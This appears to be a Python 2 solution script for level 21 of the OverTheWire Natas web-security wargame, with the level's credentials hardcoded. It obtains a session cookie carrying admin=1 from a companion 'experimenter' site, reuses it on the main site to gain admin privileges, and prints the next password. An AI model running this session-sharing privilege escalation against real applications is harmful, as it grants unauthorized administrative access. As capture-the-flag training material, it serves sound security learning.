import requests

protocol = 'http://'
username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
url = username + '.natas.labs.overthewire.org/'
login = username + ':' + password + '@'
params = ''
target = protocol + login + url + params

url1 = "natas21-experimenter.natas.labs.overthewire.org/"
params1 = '?debug=&admin=1&submit='
target1 = protocol + login + url1 + params1

r1 = requests.get( target1 )
c = r1.cookies['PHPSESSID']

r = requests.get( target, cookies=dict( PHPSESSID=c ) )
idx = r.content.find('Password: ')
print r.content[ idx : idx + 42 ]
